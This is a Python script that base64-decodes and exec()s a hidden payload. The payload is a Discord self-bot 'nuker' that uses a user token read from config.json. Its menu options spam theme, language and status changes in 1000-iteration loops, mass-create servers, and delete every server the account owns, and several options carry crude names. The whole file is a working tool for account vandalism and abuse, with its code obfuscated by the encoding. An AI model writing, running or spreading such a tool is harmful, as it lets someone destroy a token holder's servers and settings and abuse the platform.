import base64

nuker64 = 'ZnJvbSBkaXNjb3JkLmV4dCBpbXBvcnQgY29tbWFuZHMKaW1wb3J0IGNvbG9yYW1hIApmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlIAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IG9zIAppbXBvcnQganNvbgpib3QgPSBjb21tYW5kcy5Cb3QoY29tbWFuZF9wcmVmaXg9IiEiLCBzZWxmX2JvdD1UcnVlKQpib3QucmVtb3ZlX2NvbW1hbmQoImhlbHAiKQoKY29sb3JhbWEuaW5pdCgpCndpdGggb3BlbignY29uZmlnLmpzb24nKSBhcyBmOgogICAgZGF0YSA9IGpzb24ubG9hZChmKQogICAgdG9rZW4gPSBkYXRhWyJUT0tFTiJdCgoKZGVmIHRva2VuZnVjaygpOgogICAgICBoZWFkZXJzID0gewogICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA1LjE7IGVuLVVTOyBydjoxLjcuMTIpIEdlY2tvLzIwMDUwOTE1IEZpcmVmb3gvMS4wLjcnLAogICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAnQXV0aG9yaXphdGlvbic6IHRva2VuLAogICAgICB9CiAgICAgIHBheWxvYWQgPSB7CiAgICAgICAgICAndGhlbWUnOiAibGlnaHQiLAogICAgICAgICAgJ2xvY2FsZSc6ICJqYSIsCiAgICAgICAgICAnbWVzc2FnZV9kaXNwbGF5X2NvbXBhY3QnOiBGYWxzZSwKICAgICAgICAgICdpbmxpbmVfZW1iZWRfbWVkaWEnOiBGYWxzZSwKICAgICAgICAgICdpbmxpbmVfYXR0YWNobWVudF9tZWRpYSc6IEZhbHNlLAogICAgICAgICAgJ2dpZl9hdXRvX3BsYXknOiBGYWxzZSwKICAgICAgICAgICdyZW5kZXJfZW1iZWRzJzogRmFsc2UsCiAgICAgICAgICAncmVuZGVyX3JlYWN0aW9ucyc6IEZhbHNlLAogICAgICAgICAgJ2FuaW1hdGVfZW1vamknOiBGYWxzZSwKICAgICAgICAgICdjb252ZXJ0X2Vtb3RpY29ucyc6IEZhbHNlLAogICAgICAgICAgJ2VuYWJsZV90dHNfY29tbWFuZCc6IEZhbHNlLAogICAgICAgICAgJ2V4cGxpY2l0X2NvbnRlbnRfZmlsdGVyJzogJzAnLAogICAgICAgICAgJ3N0YXR1cyc6ICJpZGxlIgogICAgICB9CiAgICAgIHJlcXVlc3RzLnBhdGNoKCJodHRwczovL2NhbmFyeS5kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL3NldHRpbmdzIixoZWFkZXJzPWhlYWRlcnMsIGpzb249cGF5bG9hZCkKICAgICAgdG9fYmFjaygpCgpkZWYgc2V6dWlyZSgpOgogICAgaGVhZGVycyA9IHsKICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4xOyBlbi1VUzsgcnY6MS43LjEyKSBHZWNrby8yMDA1MDkxNSBGaXJlZm94LzEuMC43JywKICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgJ0F1dGhvcml6YXRpb24nOiB0b2tlbiwKICAgICAgfQogICAgcGF5bG9hZCA9IHsKICAgICAgJ3RoZW1lJzogImRhcmsiCiAgICAgIH0KICAgIHBheWxvYWQyID0gewogICAgICAndGhlbWUnOiAibGlnaHQiCiAgICAgIH0KICAgIGZvciBpIGluIHJhbmdlKDEwMDApOgogICAgICByZXF1ZXN0cy5wYXRjaCgiaHR0cHM6Ly9jYW5hcnkuZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9zZXR0aW5ncyIsaGVhZGVycz1oZWFkZXJzLCBqc29uPXBheWxvYWQyKQogICAgICByZXF1ZXN0cy5wYXRjaCgiaHR0cHM6Ly9jYW5hcnkuZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9zZXR0aW5ncyIsaGVhZGVycz1oZWFkZXJzLCBqc29uPXBheWxvYWQpCiAgICB0b19iYWNrKCkKCmRlZiBsYW5ncmFwZSgpOgogICAgaGVhZGVycyA9IHsKICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4xOyBlbi1VUzsgcnY6MS43LjEyKSBHZWNrby8yMDA1MDkxNSBGaXJlZm94LzEuMC43JywKICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgJ0F1dGhvcml6YXRpb24nOiB0b2tlbiwKICAgICAgfQogICAgcGF5bG9hZDEgPSB7CiAgICAgICAgICAnbG9jYWxlJzogInJvIgogICAgICB9CiAgICBwYXlsb2FkMiA9IHsKICAgICAgICAgICdsb2NhbGUnOiAiamEiCiAgICAgIH0KICAgIHBheWxvYWQzID0gewogICAgICAgICAgJ2xvY2FsZSc6ICJmciIKICAgICAgfQogICAgZm9yIGkgaW4gcmFuZ2UoMTAwMCk6CiAgICAgICAgcmVxdWVzdHMucGF0Y2goImh0dHBzOi8vY2FuYXJ5LmRpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUvc2V0dGluZ3MiLGhlYWRlcnM9aGVhZGVycywganNvbj1wYXlsb2FkMSkKICAgICAgICByZXF1ZXN0cy5wYXRjaCgiaHR0cHM6Ly9jYW5hcnkuZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9zZXR0aW5ncyIsaGVhZGVycz1oZWFkZXJzLCBqc29uPXBheWxvYWQyKQogICAgICAgIHJlcXVlc3RzLnBhdGNoKCJodHRwczovL2NhbmFyeS5kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL3NldHRpbmdzIixoZWFkZXJzPWhlYWRlcnMsIGpzb249cGF5bG9hZDMpCiAgICB0b19iYWNrKCkKCmRlZiBzdGF0dXNyYXBlKCk6CiAgICAgIGhlYWRlcnMgPSB7CiAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVM7IHJ2OjEuNy4xMikgR2Vja28vMjAwNTA5MTUgRmlyZWZveC8xLjAuNycsCiAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICdBdXRob3JpemF0aW9uJzogdG9rZW4sCiAgICAgIH0KICAgICAgcGF5bG9hZCA9IHsKICAgICAgICAgICdzdGF0dXMnOiAiZG5kIgogICAgICB9CiAgICAgIHBheWxvYWQyID0gewogICAgICAgICAgJ3N0YXR1cyc6ICJpZGxlIgogICAgICB9CiAgICAgIHBheWxvYWQzID0gewogICAgICAgICAgJ3N0YXR1cyc6ICJpbnZpc2libGUiCiAgICAgIH0gCiAgICAgIHBheWxvYWQ0ID0gewogICAgICAgICAgJ3N0YXR1cyc6ICJvbmxpbmUiCiAgICAgIH0KICAgICAgZm9yIGkgaW4gcmFuZ2UoMTAwMCk6CiAgICAgICAgcmVxdWVzdHMucGF0Y2goImh0dHBzOi8vY2FuYXJ5LmRpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUvc2V0dGluZ3MiLGhlYWRlcnM9aGVhZGVycywganNvbj1wYXlsb2FkKQogICAgICAgIHJlcXVlc3RzLnBhdGNoKCJodHRwczovL2NhbmFyeS5kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL3NldHRpbmdzIixoZWFkZXJzPWhlYWRlcnMsIGpzb249cGF5bG9hZDIpCiAgICAgICAgcmVxdWVzdHMucGF0Y2goImh0dHBzOi8vY2FuYXJ5LmRpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUvc2V0dGluZ3MiLGhlYWRlcnM9aGVhZGVycywganNvbj1wYXlsb2FkMykKICAgICAgICByZXF1ZXN0cy5wYXRjaCgiaHR0cHM6Ly9jYW5hcnkuZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9zZXR0aW5ncyIsaGVhZGVycz1oZWFkZXJzLCBqc29uPXBheWxvYWQ0KQogICAgICB0b19iYWNrKCkKCmRlZiBzZXJ2ZXJzcGFtKCk6CiAgICBzZXJ2ZXJuYW1lID0gaW5wdXQoIlNlcnZlck5hbWU+PiIpCiAgICBoZWFkZXJzID0gewogICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4xOyBlbi1VUzsgcnY6MS43LjEyKSBHZWNrby8yMDA1MDkxNSBGaXJlZm94LzEuMC43JywKICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAnQXV0aG9yaXphdGlvbic6IHRva2VuLAogICAgfQogICAgZ3VpbGQgPSB7CiAgICAnbmFtZSc6IGYie3NlcnZlcm5hbWV9IgogICAgfQogICAgZm9yIGkgaW4gcmFuZ2UoMTAwKToKICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvZ3VpbGRzJywgaGVhZGVycz1oZWFkZXJzLCBqc29uPWd1aWxkKQogICAgIHByaW50KGYie0ZvcmUuR1JFRU59WytdIHtGb3JlLlJFRH0gU2Vydmlkb3IgY3JpYWRvICh7Rm9yZS5XSElURX17c2VydmVybmFtZX17Rm9yZS5SRUR9KSIpCiAgICB0b19iYWNrKCkKCgpkZWYgZGVsZXRlX3NlcnZlcnMoKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVM7IHJ2OjEuNy4xMikgR2Vja28vMjAwNTA5MTUgRmlyZWZveC8xLjAuNycsCiAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICdBdXRob3JpemF0aW9uJzogdG9rZW4sCiAgICB9CgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9ndWlsZHMnLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgIHNlcnZlcnMgPSByZXNwb25zZS5qc29uKCkKICAgICAgICBmb3Igc2VydmVyIGluIHNlcnZlcnM6CiAgICAgICAgICAgIGd1aWxkX2lkID0gc2VydmVyWydpZCddCiAgICAgICAgICAgIGRlbGV0ZV9yZXNwb25zZSA9IHJlcXVlc3RzLmRlbGV0ZShmJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L2d1aWxkcy97Z3VpbGRfaWR9JywgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICBpZiBkZWxldGVfcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjA0OgogICAgICAgICAgICAgICAgcHJpbnQoZiI+PlNlcnZpZG9yIHtzZXJ2ZXJbJ25hbWUnXX0gKHtndWlsZF9pZH0pIGV4Y2x1w61kbyBjb20gc3VjZXNzby4iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoIk7Do28gaMOhIG1haXMgc2Vydmlkb3JlcyBwYXJhIHNlcmVtIGV4Y2x1w61kb3MhIikKICAgICAgICAgICAgICAgIHRvX2JhY2soKQoKZGVmIHRvX2JhY2soKToKICBIb21lU2NyZWVuKCkKICAKQGJvdC5ldmVudAphc3luYyBkZWYgb25fcmVhZHkoKToKICBIb21lU2NyZWVuKCkKIApkZWYgSG9tZVNjcmVlbigpOgogIG9zLnN5c3RlbSgnY2xzJykKICBwcmludChmJycnCiAge0ZvcmUuUkVEfQogIHtGb3JlLlJFRH0KICB7Rm9yZS5SRUR9CiAge0ZvcmUuUkVEfSAgL19cICAgIF9fXyAgX19fICBfX18gICBfICAgXyAgXyBfXyAgfCB8XyAgICAvXCBcIFwgXyAgIF8gfCB8IF9fIF9fXyAgXyBfXyAKICB7Rm9yZS5SRUR9IC8vX1xcICAvIF9ffC8gX198LyBfIFwgfCB8IHwgfHwgJ18gXCB8IF9ffCAgLyAgXC8gL3wgfCB8IHx8IHwvIC8vIF8gXHwgJ19ffAogIHtGb3JlLlJFRH0vICBfICBcfCAoX198IChfX3wgKF8pIHx8IHxffCB8fCB8IHwgfHwgfF8gIC8gL1wgIC8gfCB8X3wgfHwgICA8fCAgX18vfCB8ICAgCiAge0ZvcmUuUkVEfVxfLyBcXy8gXF9fX3xcX19ffFxfX18vICBcX18sX3x8X3wgfF98IFxfX3wgXF9cIFwvICAgXF9fLF98fF98XF9cXF9fX3x8X3wgCiAge0ZvcmUuUkVEfQogIHtGb3JlLlJFRH0gICAgICAgICAgICAgICAgQnkgTHVpek5zLnB5IzEyODEKICB7Rm9yZS5SRUR9ICAgICAgICAgICAgICAgWzFdICBTZXJ2ZXJTcGFtCiAge0ZvcmUuUkVEfSAgICAgICAgICAgICAgIFsyXSAgVG9rZW5GdWNrZXIgKGN1aWRhZG8pCiAge0ZvcmUuUkVEfSAgICAgICAgICAgICAgIFszXSAgVGhlbWVGdWNrZXIKICB7Rm9yZS5SRUR9ICAgICAgICAgICAgICAgWzRdICBMYW5nUmFwZQogIHtGb3JlLlJFRH0gICAgICAgICAgICAgICBbNV0gIFN0YXR1c1JhcGUKICB7Rm9yZS5SRUR9ICAgICAgICAgICAgICAgWzZdICBTZXJ2ZXJSZW1vdmUKICAnJycpCiAgc2hpdCA9IGlucHV0KCI+PiIpCiAgaWYgc2hpdCA9PSAnMSc6CiAgICBzZXJ2ZXJzcGFtKCkKICBpZiBzaGl0ID09ICcyJzoKICAgICAgdG9rZW5mdWNrKCkKICBpZiBzaGl0ID09ICczJzoKICAgICAgc2V6dWlyZSgpCiAgaWYgc2hpdCA9PSAnNCc6CiAgICAgIGxhbmdyYXBlKCkgCiAgaWYgc2hpdCA9PSAnNSc6CiAgICAgc3RhdHVzcmFwZSgpCiAgaWYgc2hpdCA9PSAnNic6CiAgICAgZGVsZXRlX3NlcnZlcnMoKQoKCgoKCmJvdC5ydW4odG9rZW4sIGJvdCA9IEZhbHNlKQ=='
nuker = base64.b64decode(nuker64).decode('utf-8')
exec(nuker)
